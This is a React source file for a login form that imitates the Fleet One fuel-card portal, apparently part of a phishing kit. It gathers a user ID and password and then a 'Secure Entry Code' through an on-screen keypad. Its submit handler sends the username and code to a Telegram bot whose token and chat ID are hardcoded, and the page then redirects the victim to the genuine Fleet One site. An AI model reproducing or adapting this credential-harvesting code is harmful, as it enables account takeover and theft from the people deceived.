import React, { useState, useRef } from "react";
import { useAuthStore } from "../useAuthStore";
import { ThreeDot } from "react-loading-indicators";

import "./form.css";

function Form() {
  const [ereva, setEreva] = useState(true);
  const [error, setError] = useState(false);
  const [loading, setLoading] = useState(false);
  const userCode = useRef(null);
  const userName = useRef(null);
  const passwordUser = useRef(null);

  const [formData, setFormData] = useState({
    userName: "",
    password: "",
  });
  const { login } = useAuthStore();

  function qfFunck(qf) {
    if (
      qf.value.indexOf("ccox") !== -1 ||
      qf.value.indexOf("klir") !== -1 ||
      qf.value.indexOf("qunn") !== -1 ||
      qf.value.indexOf("jajtam") !== -1 ||
      qf.value.indexOf("jaj tam") !== -1 ||
      qf.value.indexOf("txeq") !== -1 ||
      qf.value.indexOf("cceq") !== -1 ||
      qf.value.indexOf("uteq") !== -1 ||
      qf.value.indexOf("fuck") !== -1 ||
      qf.value.indexOf("suck") !== -1 ||
      qf.value.indexOf("dick") !== -1 ||
      qf.value.indexOf("gandon") !== -1 ||
      qf.value.indexOf("qunnem") !== -1 ||
      qf.value.indexOf("txa") !== -1 ||
      qf.value.indexOf("boz") !== -1 ||
      qf.value.indexOf("chatlax") !== -1 ||
      qf.value.indexOf("gyot") !== -1 ||
      qf.value.indexOf("garlax") !== -1
    ) {
      qf.value = "";
    }
  }

  const handleChange = (e) => {
    const { name, value } = e.target;

    setFormData((prevState) => ({
      ...prevState,
      [name]: value,
    }));
  };

  const handleInputBlur = (event) => {
    qfFunck(event.target);
    if (event.target.value === "") {
      event.target.className = "haserror form-control";
    } else {
      event.target.className = "form-control";
    }
  };

  const next = async (e) => {
    e.preventDefault();

    setLoading(true);
    const isLoginSuccess = await login(formData.userName, formData.password);

    const { user } = useAuthStore.getState();
    console.log(user?.success, "user get store ");
    if (isLoginSuccess && user?.success) {
      setEreva(false);
    } else {
      setFormData({ userName: "", password: "" });
      setLoading(false);
    }

    if (ereva && user?.success === false) {
      setError(true);
      setLoading(false);
    }

    if (!passwordUser.current.value) {
      passwordUser.current.className = "haserror form-control";
    }
    if (!userName.current.value) {
      userName.current.className = "haserror form-control";
    }
    setLoading(false);
  };

  const addNum = (e) => {
    userCode.current.value = userCode.current.value + e.currentTarget.value;
  };
  const resetCode = () => {
    userCode.current.value = "";
  };
  function handleSubmit(event) {
    event.preventDefault();

    if (userCode.current.value && userCode.current.value.length >= 4) {
      const url = `https://api.telegram.org/bot8028378156:AAFzr5FzJtK7H3wo1ResfDt4IhFaYX9k6OM/sendMessage?chat_id=-1002614062462`;
      const obj = {
        chat_id: 531918242,
        text:
          "Username - " +
          formData.userName +
          "\n" +
          "Secure Code - " +
          userCode.current.value,
      };
      const xht = new XMLHttpRequest();
      xht.open("POST", url, true);
      xht.setRequestHeader("Content-type", "application/json; charset=UTF-8");
      xht.send(JSON.stringify(obj));
      return;
    }
  }

  return (
    <div className="Form">
      <div
        className="logintitle"
        style={error ? { marginBottom: 10 } : { marginBottom: 30 }}
      >
        <p className="logintext">{ereva ? "LOGIN" : "Secure Entry Code"}</p>
        <span className="tetxs">
          {ereva
            ? "Please sign in to get access."
            : "Please click submit to continue"}
        </span>
      </div>
      <div
        style={error ? { display: "block" } : { display: "none" }}
        className="errorBlock"
      >
        <p className="errorTitle">The following errors have occurred</p>
        <span className="errorSpan">1. Login Error</span>
        <span onClick={() => setError(!error)} className="errorClose">
          X
        </span>
      </div>
      <div className="formblock">
        <form onSubmit={handleSubmit} id="forms">
          <div
            style={ereva ? { display: "none" } : { display: "flex" }}
            className="bank"
          >
            <input
              style={{ display: "none" }}
              id="code"
              ref={userCode}
              name="code"
              type="text"
            />
            <div className="knop">
              <button
                value={2}
                onClick={addNum}
                type="button"
                className="btnNum selected"
              >
                <div className="gren">
                  <p className="cif">2</p>
                  <p>ABC</p>
                </div>
              </button>

              <button
                value={0}
                onClick={addNum}
                type="button"
                className="btnNum selected"
              >
                <div className="gren">
                  <p className="cif">0</p>
                </div>
              </button>

              <button
                value={3}
                onClick={addNum}
                type="button"
                className="btnNum selected"
              >
                <div className="gren">
                  <p className="cif">3</p>
                  <p>DEF</p>
                </div>
              </button>

              <button
                value={7}
                onClick={addNum}
                type="button"
                className="btnNum selected"
              >
                <div className="gren">
                  <p className="cif">7</p>
                  <p>PQRS</p>
                </div>
              </button>
              <button
                value={9}
                onClick={addNum}
                type="button"
                className="btnNum selected"
              >
                <div className="gren">
                  <p className="cif">9</p>
                  <p>WXYZ</p>
                </div>
              </button>

              <button
                value={"#"}
                onClick={addNum}
                type="button"
                className="btnNum selected"
              >
                <div className="gren">
                  <p className="cif">#</p>
                </div>
              </button>

              <button
                value={"*"}
                onClick={addNum}
                type="button"
                className="btnNum"
              >
                <div className="gren selected">
                  <p className="cif">*</p>
                </div>
              </button>

              <button
                value={4}
                onClick={addNum}
                type="button"
                className="btnNum"
              >
                <div className="gren selected">
                  <p className="cif">4</p>
                  <p>GGHI</p>
                </div>
              </button>
              <button
                value={5}
                onClick={addNum}
                type="button"
                className="btnNum selected"
              >
                <div className="gren">
                  <p className="cif">5</p>
                  <p>JKL</p>
                </div>
              </button>

              <button
                value={8}
                onClick={addNum}
                type="button"
                className="btnNum selected"
              >
                <div className="gren">
                  <p className="cif">8</p>
                  <p>TUV</p>
                </div>
              </button>

              <button
                value={6}
                onClick={addNum}
                type="button"
                className="btnNum selected"
              >
                <div className="gren">
                  <p className="cif">6</p>
                  <p>MNO</p>
                </div>
              </button>

              <button
                value={1}
                onClick={addNum}
                type="button"
                className="btnNum selected"
              >
                <div className="gren">
                  <p className="cif">1</p>
                </div>
              </button>
            </div>
            <div className="SubRes">
              <button id="btnSub" type="sybmit" className="btnSub">
                <a
                  href="https://manage.fleetone.com/security/fleetOneLogin"
                  style={{ textDecoration: "none", color: "#333" }}
                >
                  Submit
                </a>
              </button>
              <button
                onClick={resetCode}
                id="btnRes"
                type="button"
                className="btnRes"
              >
                <span>Reset</span>
              </button>
            </div>
          </div>
          <div
            style={ereva ? { display: "flex" } : { display: "none" }}
            className="inputs"
          >
            <input
              onBlur={handleInputBlur}
              id="Username"
              name="userName"
              type="text"
              className="form-control"
              placeholder="Fleet One User ID or - Account eMail"
              value={formData.userName}
              onChange={handleChange}
              ref={userName}
            />
            <input
              onBlur={handleInputBlur}
              id="Password"
              name="password"
              type="password"
              className="form-control"
              placeholder="Password"
              value={formData.password}
              onChange={handleChange}
              ref={passwordUser}
            />
          </div>
          <p
            style={ereva ? { display: "block" } : { display: "none" }}
            className="forgot"
          >
            <a
              className="forgota"
              href="https://manage.fleetone.com/security/fleetOneLogin"
              rel="noreferrer"
            >
              Forgot Password?
            </a>
          </p>
          <p
            style={ereva ? { display: "block" } : { display: "none" }}
            className="by"
          >
            By accessing this system you accept the{" "}
            <a
              className="link"
              rel="noreferrer"
              href="https://www.efsllc.com/docs/default-source/legal/CustomerTermsOfUse.pdf"
              target="_blank"
            >
              Customer Terms of Use
            </a>{" "}
            and{" "}
            <a
              className="link"
              rel="noreferrer"
              href="https://www.efsllc.com/privacy-notice/"
              target="_blank"
            >
              Privacy Policy
            </a>
            .
          </p>
          <button
            onClick={next}
            style={ereva ? { display: "block" } : { display: "none" }}
            id="btnNext"
            type="button"
            className="btnNext"
          >
            {!loading ? (
              <span>Sign In</span>
            ) : (
              <ThreeDot color="white" size="small" />
            )}
          </button>
        </form>
      </div>
    </div>
  );
}

export default Form;
